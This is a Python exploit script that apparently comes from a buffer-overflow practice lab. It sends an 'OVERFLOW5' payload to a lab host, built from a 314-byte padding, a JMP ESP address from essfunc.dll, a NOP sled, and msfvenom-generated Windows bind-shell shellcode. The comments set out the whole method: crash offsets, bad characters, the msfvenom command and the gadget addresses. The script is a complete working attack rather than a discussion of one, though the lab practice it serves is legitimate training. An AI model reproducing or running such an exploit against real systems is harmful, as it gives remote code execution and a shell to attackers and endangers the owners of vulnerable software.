import socket
import time


# Fuzzing shows crash at 400 bytes input

host = "10.10.5.232"
port = 1337

offset = 314
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xfc\xbb\x10\x7d\x8e\xe1\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    b"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xec\x95\x0c\xe1\x0c"
    b"\x66\x71\x6b\xe9\x57\xb1\x0f\x7a\xc7\x01\x5b\x2e\xe4\xea\x09"
    b"\xda\x7f\x9e\x85\xed\xc8\x15\xf0\xc0\xc9\x06\xc0\x43\x4a\x55"
    b"\x15\xa3\x73\x96\x68\xa2\xb4\xcb\x81\xf6\x6d\x87\x34\xe6\x1a"
    b"\xdd\x84\x8d\x51\xf3\x8c\x72\x21\xf2\xbd\x25\x39\xad\x1d\xc4"
    b"\xee\xc5\x17\xde\xf3\xe0\xee\x55\xc7\x9f\xf0\xbf\x19\x5f\x5e"
    b"\xfe\x95\x92\x9e\xc7\x12\x4d\xd5\x31\x61\xf0\xee\x86\x1b\x2e"
    b"\x7a\x1c\xbb\xa5\xdc\xf8\x3d\x69\xba\x8b\x32\xc6\xc8\xd3\x56"
    b"\xd9\x1d\x68\x62\x52\xa0\xbe\xe2\x20\x87\x1a\xae\xf3\xa6\x3b"
    b"\x0a\x55\xd6\x5b\xf5\x0a\x72\x10\x18\x5e\x0f\x7b\x75\x93\x22"
    b"\x83\x85\xbb\x35\xf0\xb7\x64\xee\x9e\xfb\xed\x28\x59\xfb\xc7"
    b"\x8d\xf5\x02\xe8\xed\xdc\xc0\xbc\xbd\x76\xe0\xbc\x55\x86\x0d"
    b"\x69\xc3\x8e\xa8\xc2\xf6\x73\x0a\xb3\xb6\xdb\xe3\xd9\x38\x04"
    b"\x13\xe2\x92\x2d\xbc\x1f\x1d\x40\x61\xa9\xfb\x08\x89\xff\x54"
    b"\xa4\x6b\x24\x6d\x53\x93\x0e\xc5\xf3\xdc\x58\xd2\xfc\xdc\x4e"
    b"\x74\x6a\x57\x9d\x40\x8b\x68\x88\xe0\xdc\xff\x46\x61\xaf\x9e"
    b"\x57\xa8\x47\x02\xc5\x37\x97\x4d\xf6\xef\xc0\x1a\xc8\xf9\x84"
    b"\xb6\x73\x50\xba\x4a\xe5\x9b\x7e\x91\xd6\x22\x7f\x54\x62\x01"
    b"\x6f\xa0\x6b\x0d\xdb\x7c\x3a\xdb\xb5\x3a\x94\xad\x6f\x95\x4b"
    b"\x64\xe7\x60\xa0\xb7\x71\x6d\xed\x41\x9d\xdc\x58\x14\xa2\xd1"
    b"\x0c\x90\xdb\x0f\xad\x5f\x36\x94\xdd\x15\x1a\xbd\x75\xf0\xcf"
    b"\xff\x1b\x03\x3a\xc3\x25\x80\xce\xbc\xd1\x98\xbb\xb9\x9e\x1e"
    b"\x50\xb0\x8f\xca\x56\x67\xaf\xde\x56\x87\x4f\xe1"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW5 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 356B4134
# ESP at crash: 0191FA30 -> 41366B41


# EIP Pattern Offset: 314
# ESP (0x0191fa30) points at offset 318

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x16, 0x2f, 0xf4, 0xfd

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x16\x2f\xf4\xfd'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
